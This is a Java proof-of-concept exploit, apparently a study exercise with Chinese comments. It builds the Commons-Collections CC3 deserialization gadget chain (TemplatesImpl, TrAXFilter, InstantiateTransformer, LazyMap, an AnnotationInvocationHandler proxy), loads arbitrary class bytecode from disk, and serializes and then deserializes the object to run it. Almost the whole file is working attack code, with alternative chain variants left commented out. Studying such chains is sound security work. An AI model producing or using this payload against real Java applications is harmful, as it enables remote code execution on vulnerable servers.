import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * AnnotationInvocationHandler.readObject()
 * 	Map(Proxy).entrySet()
 * 		AnnotationInvocationHandler.invoke()
 * 			LazyMap.get()
 * 				ChainedTransformer.transform()
 * 					ConstantTransformer.transform()
 * 						InstantiateTransformer.transform()
 * 							TrAXFilter.TrAXFilter()
 * 								TemplatesImpl.newTransformer()
 * 									TemplatesImpl.getTransletInstance()
 * 										TemplatesImpl.defineTransletClasses()
 * 											TransletClassLoader.defineClass()
 */
public class CC3 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();

        Class c = templates.getClass();
        Field fieldName = c.getDeclaredField("_name");
//        为了满足if判断逻辑
        fieldName.setAccessible(true);
        fieldName.set(templates,"aaa");
//         获取字节码属性
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);

//        获取字节码
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

//        不进行序列化时触发需要的一个属性
//        Field tfactory = c.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());
//
//        Transformer transformer = (Transformer) templates.newTransformer();

//        通过CC1后半条链 InvokerTransformer
//        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer", null, null),
//        });
//

//        通过InstantiateTransformer初始化TrAXFilter来执行
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);

//        使用ChainedTransformer包裹InstantiateTransformer，并触发InstantiateTransformer.transformer
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        });


//      TransformedMap链
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("value","123");
//        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
//
//        Class ccc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = ccc.getDeclaredConstructor(Class.class, Map.class);
//        constructor.setAccessible(true);
//        Object o = constructor.newInstance(Target.class, decorate);

//        LazyMap链
        HashMap<Object, Object> map = new HashMap<>();
        Map lazy = LazyMap.decorate(map, chainedTransformer);

        Class ccc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = ccc.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazy);

        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler);

        Object o = constructor.newInstance(Override.class, mapProxy);



        serialize(o);
        unSerialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
